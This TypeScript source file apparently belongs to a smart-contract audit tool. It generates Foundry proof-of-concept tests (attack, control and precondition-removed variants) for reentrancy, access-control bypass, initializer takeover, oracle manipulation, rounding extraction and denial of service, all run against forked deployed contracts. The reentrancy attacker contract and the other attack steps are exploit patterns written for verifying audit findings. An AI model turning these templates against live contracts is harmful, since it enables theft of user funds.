/**
 * PoC synthesis — turn a lead into tests that either prove the bug or admit
 * they could not.
 *
 * Every spec emits THREE tests:
 *
 *   attack   performs the exploit. Must FAIL when the bug is present.
 *   control  identical fixture, attack step removed. Must PASS always.
 *   nocond   identical fixture, the ENABLING PRECONDITION removed and the
 *            attack's own assertion kept. Must PASS when the claim is real.
 *
 * `control` proves the fixture is sound. `nocond` is stronger: it is the
 * counterfactual judge() needs for causality, because it keeps the assertion
 * that failed and only removes the condition that allowed the effect. If the
 * effect survives removal of the precondition, the precondition was not the
 * cause and the claim collapses to `partial`.
 *
 * The third piece of evidence is the measurement. The attack prints
 *
 *     IMPACT_BEFORE=<n>
 *     IMPACT_AFTER=<n>
 *     IMPACT_DESC=<text>
 *
 * through `_impact()`. `judge()` refuses `proven` without a measured delta, so
 * a PoC that cannot say what changed is reported as partial rather than
 * dressed up as a finding.
 *
 * Two honesty constraints on the generated Solidity, both of which exist
 * because the alternative produces false failures that look like evidence:
 *
 * - Deltas are computed in int256. `uint256 after - uint256 before` underflows
 *   when the attacker lost money (the normal, non-buggy case) and the resulting
 *   panic revert matches judge()'s "real assertion" patterns. A harness that
 *   reverts on underflow manufactures the very failure it is meant to detect.
 * - Value held by an attacker-controlled contract counts toward the attacker's
 *   position. A reentrant gain that lands in the helper contract is still a
 *   gain; ignoring it under-reports real exploits.
 *
 * The generator writes the harness, never the assertion text. Every assertion
 * compares a measured quantity.
 */

export interface Lead {
  playbook: string;
  file: string;
  line: number;
  snippet: string;
  severity: string;
}

export type ImpactKind = 'value_transfer' | 'unauthorized_access' | 'state_corruption' | 'denial' | 'other';

export interface PocSpec {
  test_name: string;
  /**
   * The paired control: identical setup, attack step removed.
   * A passing control is what makes the attack result interpretable.
   */
  control_name: string;
  /**
   * The precondition-removed run: same assertion, enabling condition absent.
   * This is the counterfactual judge() consumes as `without_precondition`.
   */
  nocond_name: string;
  solidity: string;
  claim: { kind: ImpactKind; description: string };
  requires: string[];
  /**
   * True when the harness deploys its own copy of the contract from source.
   *
   * This is load-bearing for counterfactual choice: a source patch can only
   * change behaviour the test actually executes. A PoC that attaches to a
   * deployed address via `vm.envAddress("TARGET")` runs against the LIVE
   * bytecode on the fork, so patching the source and re-running the same test
   * would prove nothing at all. For those specs the only valid counterfactual
   * is removing the precondition.
   */
  self_deployed: boolean;
}

/** Solidity string literal escaping for the generated description. */
function solString(s: string): string {
  return `"${s.replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/\n/g, '\\n').replace(/\r/g, '\\r')}"`;
}

const header = (contract: string, forkBlock: number, chainId: number | null) => `// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {${contract}} from "../src/${contract}.sol";

/// PoC generated by Asterion for ${contract} at block ${forkBlock}${chainId === null ? '' : ` on chain ${chainId}`}.
/// Each class emits (attack, control, nocond):
///   attack  must FAIL when the bug is present
///   control must PASS, or the fixture is broken and the attack means nothing
///   nocond  must PASS, or the precondition was not the cause
contract ${contract}_PoC is Test {
    ${contract} target;
    address attacker = address(0xA77ACC);
    address victim   = address(0xBEEF);

    /// The chain this PoC is only meaningful on${chainId === null ? ' (none pinned: the environment decides)' : `.
    /// Hard-coded, not taken from the environment: the whole point is to catch a
    /// fork of the wrong chain, and an env-supplied expectation would agree with
    /// whatever the environment happened to be.`}
    uint256 constant EXPECTED_CHAIN_ID = ${chainId === null ? '0' : String(chainId)};

    function setUp() public {
        vm.createSelectFork(vm.envString("FORK_RPC"), ${forkBlock});
        // The guard. prove.yml asserts \`cast chain-id\` against the chain it used
        // to pick the RPC secret, but that assertion runs in a shell and cannot
        // see the fork Foundry actually took. Checking here makes a wrong-chain
        // fork a FAILING test rather than a delta measured against unrelated
        // state that a judge could then call a reproduction.
        // 0 = no chain pinned (a repo-only brief); the guard is then a no-op.
        if (EXPECTED_CHAIN_ID != 0) {
            require(
                block.chainid == EXPECTED_CHAIN_ID,
                string.concat(
                    "WRONG CHAIN: fork is chain ",
                    vm.toString(block.chainid),
                    " but this PoC was written for ",
                    vm.toString(EXPECTED_CHAIN_ID)
                )
            );
        }
        target = ${contract}(vm.envAddress("TARGET"));
        vm.deal(attacker, 100 ether);
        vm.deal(victim, 100 ether);
    }

    /// Machine-readable measurement. judge.mjs parses these three lines out of
    /// the -vvv trace of the FAILING attack test; nothing else consumes them.
    /// Emitted before the assertion so a reproduction still carries its numbers.
    function _impact(uint256 before_, uint256 after_, string memory desc) internal {
        console2.log(string.concat("IMPACT_BEFORE=", vm.toString(before_)));
        console2.log(string.concat("IMPACT_AFTER=", vm.toString(after_)));
        console2.log(string.concat("IMPACT_DESC=", desc));
    }
`;

/** Reentrant attacker used by the reentrancy tests. */
const REENTERER = `
contract Reenterer {
    address public immutable target;
    bool private armed;
    uint256 private depth;

    constructor(address t) { target = t; }
    function arm() external { armed = true; }

    function deposit() external payable {
        (bool ok, ) = target.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(ok, "deposit failed");
    }

    receive() external payable {
        if (armed && depth < 3) {
            depth++;
            target.call(abi.encodeWithSignature("withdraw(uint256)", 1));
        }
    }
}
`;

/**
 * Choose a harness shape for this lead. Returning null is a valid, honest
 * answer: it means this class needs a human to express the mechanism.
 */
export function synthesize(lead: Lead, opts: SynthOpts): PocSpec | null {
  const { contract, forkBlock, chainId = null } = opts;
  const n = lead.line;
  const head = header(contract, forkBlock, chainId);

  switch (lead.playbook) {
    case 'sol.reentrancy': {
      const t = `test_reentrancy_${n}`;
      return {
        test_name: t,
        control_name: `${t}_control`,
        nocond_name: `${t}_nocond`,
        self_deployed: false,
        requires: ['FORK_RPC', 'TARGET', `a value-transferring function in ${contract}`],
        claim: { kind: 'value_transfer', description: 'attacker withdraws more than deposited via reentrant callback' },
        solidity: `${head}
    function ${t}() public {
        uint256 before_ = attacker.balance;

        Reenterer r;
        vm.startPrank(attacker);
        r = new Reenterer(address(target));
        r.arm();
        r.deposit{value: 1 ether}();
        vm.stopPrank();

        // Attacker-controlled value: the EOA plus the helper contract it owns.
        uint256 after_ = attacker.balance + address(r).balance;
        // int256: a loss is the normal case and must not underflow into a panic.
        int256 delta = int256(after_) - int256(before_);
        console2.log(string.concat("attacker delta=", vm.toString(delta)));
        _impact(before_, after_, ${solString('attacker-controlled ether before and after a reentrant withdrawal (delta logged)')});

        // Bug present => attacker is up after supplying 1 ether.
        assertLt(delta, int256(1 ether), "REENTRANCY: extracted more than supplied");
    }

    function ${t}_control() public {
        uint256 before_ = attacker.balance;
        vm.startPrank(attacker);
        (bool ok, ) = address(target).call{value: 1 ether}(abi.encodeWithSignature("deposit()"));
        vm.stopPrank();
        require(ok, "control deposit failed");
        // No reentry: attacker is down exactly the deposit.
        assertEq(before_ - attacker.balance, 1 ether, "CONTROL: baseline accounting broken");
    }

    /// Same fixture, enabling precondition removed: the callback is never armed,
    /// so the target is entered exactly once. The attack's assertion must hold.
    function ${t}_nocond() public {
        uint256 before_ = attacker.balance;

        Reenterer r;
        vm.startPrank(attacker);
        r = new Reenterer(address(target));
        // r.arm() deliberately omitted: no reentry is possible.
        r.deposit{value: 1 ether}();
        vm.stopPrank();

        uint256 after_ = attacker.balance + address(r).balance;
        int256 delta = int256(after_) - int256(before_);
        console2.log(string.concat("nocond delta=", vm.toString(delta)));
        assertLt(delta, int256(1 ether), "NOCOND: value leaked without re-entry, so re-entry was not the cause");
    }
}
${REENTERER}`,
      };
    }

    case 'sol.accesscontrol': {
      const t = `test_access_control_${n}`;
      return {
        test_name: t,
        control_name: `${t}_control`,
        nocond_name: `${t}_nocond`,
        self_deployed: false,
        requires: ['FORK_RPC', 'TARGET', 'the privileged function signature (CHANGE_ME)'],
        claim: { kind: 'unauthorized_access', description: 'a non-privileged account reaches a privileged function' },
        solidity: `${head}
    function ${t}() public {
        address owner = target.owner();
        require(attacker != owner, "attacker already owner");

        vm.startPrank(attacker, attacker);
        (bool ok, ) = address(target).call(abi.encodeWithSignature("CHANGE_ME(address)", attacker));
        vm.stopPrank();

        console2.log("attacker call succeeded", ok);
        // Measured, not asserted: 0 = the call was rejected, 1 = it went through.
        _impact(0, ok ? uint256(1) : uint256(0), ${solString('an unprivileged caller reaches a privileged function (0 = rejected, 1 = accepted)')});
        assertFalse(ok, "ACCESS CONTROL: non-owner reached a privileged function");
    }

    function ${t}_control() public {
        address owner = target.owner();
        vm.startPrank(owner, owner);
        (bool ok, ) = address(target).call(abi.encodeWithSignature("CHANGE_ME(address)", owner));
        vm.stopPrank();
        assertTrue(ok, "CONTROL: owner cannot call it either; function is broken");
    }

    /// Enabling precondition removed: the caller is the privileged account.
    /// Same call, same assertion, so a failure here falsifies the mechanism.
    function ${t}_nocond() public {
        address owner = target.owner();

        vm.startPrank(owner, owner);
        (bool ok, ) = address(target).call(abi.encodeWithSignature("CHANGE_ME(address)", owner));
        vm.stopPrank();

        _impact(0, ok ? uint256(1) : uint256(0), ${solString('the privileged account reaches the same function (0 = rejected, 1 = accepted)')});
        assertFalse(ok, "NOCOND: the privileged caller was rejected too, so access control is not the difference");
    }
}`,
      };
    }

    case 'sol.upgrade': {
      const t = `test_initializer_${n}`;
      return {
        test_name: t,
        control_name: `${t}_control`,
        nocond_name: `${t}_nocond`,
        // Deploys its own instance, so a source patch IS observable by this test
        // and a with-fix counterfactual is legitimate here.
        self_deployed: true,
        requires: ['FORK_RPC', 'TARGET', 'a deployable implementation copy'],
        claim: { kind: 'unauthorized_access', description: 'unprivileged account seizes ownership through an unguarded initializer' },
        solidity: `${head}
    function ${t}() public {
        ${contract} fresh = new ${contract}();
        vm.prank(attacker);
        (bool ok, ) = address(fresh).call(abi.encodeWithSignature("initialize(address)", attacker));
        _impact(0, ok ? uint256(1) : uint256(0), ${solString('an unprivileged caller initializes a fresh implementation (0 = rejected, 1 = accepted)')});
        if (!ok) return; // guarded: nothing to report
        console2.log("new owner", fresh.owner());
        assertNotEq(fresh.owner(), attacker, "INITIALIZER: anyone can take ownership");
    }

    function ${t}_control() public {
        ${contract} fresh = new ${contract}();
        vm.prank(address(this));
        (bool ok, ) = address(fresh).call(abi.encodeWithSignature("initialize(address)", address(this)));
        assertTrue(ok, "CONTROL: initializer does not work even for the deployer");
    }

    /// Enabling precondition removed: the first caller is the deployer, which is
    /// the legitimate path. Ownership must not reach the attacker.
    function ${t}_nocond() public {
        ${contract} fresh = new ${contract}();
        (bool ok, ) = address(fresh).call(abi.encodeWithSignature("initialize(address)", address(this)));
        assertTrue(ok, "NOCOND: the initializer is not callable at all, so it is not initializable to begin with");
        _impact(0, fresh.owner() == attacker ? uint256(1) : uint256(0), ${solString('ownership after the deployer initializes (1 = attacker holds it)')});
        assertNotEq(fresh.owner(), attacker, "NOCOND: ownership reached the attacker without the unprivileged-caller precondition");
    }
}`,
      };
    }

    case 'sol.oracle': {
      const t = `test_oracle_spot_${n}`;
      return {
        test_name: t,
        control_name: `${t}_control`,
        nocond_name: `${t}_nocond`,
        self_deployed: false,
        requires: ['FORK_RPC', 'TARGET', 'a pool address with real liquidity'],
        claim: { kind: 'value_transfer', description: 'a single-transaction swap moves the price the protocol consumes' },
        solidity: `${head}
    function ${t}() public {
        uint256 p0 = priceView();
        swapOnPool(50 ether);
        uint256 p1 = priceView();

        console2.log("before", p0);
        console2.log("after", p1);
        _impact(p0, p1, ${solString('the price the protocol consumes before and after one swap')});

        uint256 delta = p1 > p0 ? p1 - p0 : p0 - p1;
        assertLt((delta * 100) / (p0 == 0 ? 1 : p0), 20, "ORACLE: spot price moved 20%+ in one swap");
    }

    function ${t}_control() public {
        uint256 p0 = priceView();
        uint256 p1 = priceView();
        assertEq(p0, p1, "CONTROL: price view is not deterministic");
    }

    /// Enabling precondition removed: no swap is performed. The same bound must
    /// hold, which shows the movement came from the swap and not from the view.
    function ${t}_nocond() public {
        uint256 p0 = priceView();
        uint256 p1 = priceView();

        _impact(p0, p1, ${solString('the price the protocol consumes with no swap performed')});
        uint256 delta = p1 > p0 ? p1 - p0 : p0 - p1;
        assertLt((delta * 100) / (p0 == 0 ? 1 : p0), 20, "NOCOND: the price moves without any swap, so the swap was not the cause");
    }

    function swapOnPool(uint256) internal { /* wire to the pool */ }
    function priceView() internal view returns (uint256) { return 0; }
}`,
      };
    }

    case 'sol.rounding':
    case 'sol.inflation': {
      // Distinct names: these two classes share a harness shape but must not
      // collide, or one attempt would overwrite the other's test file.
      const t = lead.playbook === 'sol.inflation' ? `test_shares_${n}` : `test_rounding_${n}`;
      return {
        test_name: t,
        control_name: `${t}_control`,
        nocond_name: `${t}_nocond`,
        self_deployed: false,
        requires: ['FORK_RPC', 'TARGET', 'deposit and withdraw entrypoints'],
        claim: { kind: 'value_transfer', description: 'repeated small operations extract value through truncation' },
        solidity: `${head}
    function ${t}() public {
        uint256 start = attacker.balance;
        vm.startPrank(attacker);
        for (uint256 i = 0; i < 40; i++) {
            (bool a, ) = address(target).call{value: 1 gwei}(abi.encodeWithSignature("deposit()"));
            if (!a) break;
            (bool b, ) = address(target).call(abi.encodeWithSignature("withdraw(uint256)", 1 gwei));
            if (!b) break;
        }
        vm.stopPrank();

        console2.log("start", start);
        console2.log("end", attacker.balance);
        _impact(start, attacker.balance, ${solString('attacker balance before and after 40 small round trips')});
        assertLe(attacker.balance, start, "ROUNDING: profited from truncation");
    }

    function ${t}_control() public {
        uint256 start = attacker.balance;
        vm.startPrank(attacker);
        (bool a, ) = address(target).call{value: 1 ether}(abi.encodeWithSignature("deposit()"));
        if (a) {
            address(target).call(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
        }
        vm.stopPrank();
        assertLe(attacker.balance, start, "CONTROL: single round trip already profitable");
    }

    /// Enabling precondition removed: ONE small round trip instead of 40. The
    /// same bound must hold, isolating repetition-plus-truncation as the cause.
    function ${t}_nocond() public {
        uint256 start = attacker.balance;
        vm.startPrank(attacker);
        (bool a, ) = address(target).call{value: 1 gwei}(abi.encodeWithSignature("deposit()"));
        if (a) {
            address(target).call(abi.encodeWithSignature("withdraw(uint256)", 1 gwei));
        }
        vm.stopPrank();

        _impact(start, attacker.balance, ${solString('attacker balance before and after a single small round trip')});
        assertLe(attacker.balance, start, "NOCOND: a single round trip already profits, so repetition was not the cause");
    }
}`,
      };
    }

    case 'sol.dos': {
      const t = `test_dos_${n}`;
      return {
        test_name: t,
        control_name: `${t}_control`,
        nocond_name: `${t}_nocond`,
        self_deployed: false,
        requires: ['FORK_RPC', 'TARGET', 'the state-growth vector and a target function'],
        claim: { kind: 'denial', description: 'user-growable state makes a function uncallable' },
        solidity: `${head}
    function ${t}() public {
        vm.startPrank(attacker);
        for (uint256 i = 0; i < 500; i++) {
            (bool ok, ) = address(target).call(abi.encodeWithSignature("CHANGE_ME(address)", address(uint160(i))));
            if (!ok) break;
        }
        vm.stopPrank();

        uint256 g = gasleft();
        (bool stillWorks, ) = address(target).call(abi.encodeWithSignature("sweep()"));
        console2.log("sweep gas", g - gasleft());
        // Measured: 1 = callable before growth, 0 = no longer callable after.
        _impact(uint256(1), stillWorks ? uint256(1) : uint256(0), ${solString('whether the target function is callable before and after user-driven state growth (1 = callable)')});
        assertTrue(stillWorks, "DOS: function became uncallable after state growth");
    }

    function ${t}_control() public {
        (bool ok, ) = address(target).call(abi.encodeWithSignature("sweep()"));
        assertTrue(ok, "CONTROL: function does not work even at baseline");
    }

    /// Enabling precondition removed: no state growth is performed. The same
    /// assertion must hold, so the uncallability came from the growth.
    function ${t}_nocond() public {
        (bool stillWorks, ) = address(target).call(abi.encodeWithSignature("sweep()"));
        _impact(uint256(1), stillWorks ? uint256(1) : uint256(0), ${solString('whether the target function is callable with no state growth (1 = callable)')});
        assertTrue(stillWorks, "NOCOND: the function is uncallable at baseline, so state growth was not the cause");
    }
}`,
      };
    }

    default:
      // No honest harness for this class yet. Saying so is the correct answer.
      return null;
  }
}

export interface SynthOpts {
  contract: string;
  forkBlock: number;
  /**
   * EVM chain this PoC is only meaningful on. `null` means "no chain pinned"
   * (a repo-only brief) and makes the generated guard a no-op.
   *
   * Emitted as `EXPECTED_CHAIN_ID` in the harness header so a wrong-chain fork
   * fails loudly in setUp instead of yielding a delta against unrelated state.
   */
  chainId?: number | null;
}

